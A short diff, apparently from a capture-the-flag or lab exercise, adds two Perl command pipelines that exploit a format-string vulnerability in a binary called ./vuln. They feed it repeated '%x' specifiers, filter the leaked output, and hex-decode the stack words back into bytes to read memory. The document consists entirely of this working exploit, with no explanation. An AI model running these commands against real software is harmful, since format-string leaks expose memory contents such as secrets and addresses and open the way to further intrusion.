@@ -1,0 +1,3 @@
+perl -e 'print "1";print "%x";print ".%x" x 20' | ./vuln | perl -ne 'print if /1\./' | perl -ne 'chomp;my @lines = split(/\./);my @updated_lines = map($_ . "\n",@lines);print @updated_lines' | perl -ne 'print pack("H*",$_);'
+
+perl -e 'print "1";print "%x";print ".%x" x 20' | ./vuln | perl -ne 'print if /1\./' | perl -ne 'chomp;my @lines = split(/\./);print @lines;' | perl -ne 'print pack("H*",$_);'
